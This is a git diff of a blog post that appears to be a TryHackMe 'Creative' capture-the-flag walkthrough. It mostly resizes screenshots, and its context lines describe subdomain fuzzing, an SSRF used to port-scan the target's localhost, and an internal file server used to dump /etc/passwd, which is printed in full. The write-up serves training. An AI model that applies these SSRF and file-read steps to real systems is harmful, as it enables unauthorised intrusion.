@@ -55,7 +55,7 @@ echo "$IP creative.thm" | sudo tee -a /etc/hosts
 
 Now, let's fire up the browser.
 
-![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo1.webp){: width="972" height="589" }
+![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo1.webp){: width="1165" height="982" }
 
 It's a pretty standard-looking business website. Before we get lost clicking around, let's run a `gobuster` scan to look for hidden directories and files.
 
@@ -120,15 +120,15 @@ beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration:
 
 Bingo! We found `beta.creative.thm`. Let's add that to our `/etc/hosts` file and see what's there.
 
-![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo2.webp){: width="972" height="589" }
+![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo2.webp){: width="1529" height="306" }
 
 This page has a URL input field. It smells like **Server-Side Request Forgery (SSRF)**. The server is likely taking our URL, fetching the content from that URL, and then displaying it back to us. We can test this by pointing it to a webserver we control.
 
 Let's start a quick Python webserver on our machine.
-![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo3.webp){: width="972" height="589" }
+![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo4.webp){: width="598" height="114" }
 
 And then give our IP to the form.
-![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo4.webp){: width="972" height="589" }
+![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo3.webp){: width="622" height="175" }
 
 Success! The target server made a GET request to our Python server. This confirms the SSRF vulnerability. We can now use the server as a proxy to scan its own internal network (`127.0.0.1`). Let's use `ffuf` again to scan all 65,535 ports on its localhost.
 
@@ -164,13 +164,12 @@ ________________________________________________
 
 Look at that! Port `1337` is open internally. Let's see what's running on it by manually submitting `http://127.0.0.1:1337` to the form.
 
-![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo5.webp){: width="972" height="589" }
-![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo6.webp){: width="972" height="589" }
+![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo5.webp){: width="1537" height="347" }
+![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo6.webp){: width="435" height="693" }
 
 It's a simple file server that allows directory listing! However, it seems we can only access the root (`/`). If we try to append a path, like `/etc/`, it can read the contents. This means we can read any file on the system!
 
 Let's grab `/etc/passwd` to find a username.
-![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo7.webp){: width="972" height="589" }
 
 ```text
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin saad:x:1000:1000:saad:/home/saad:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
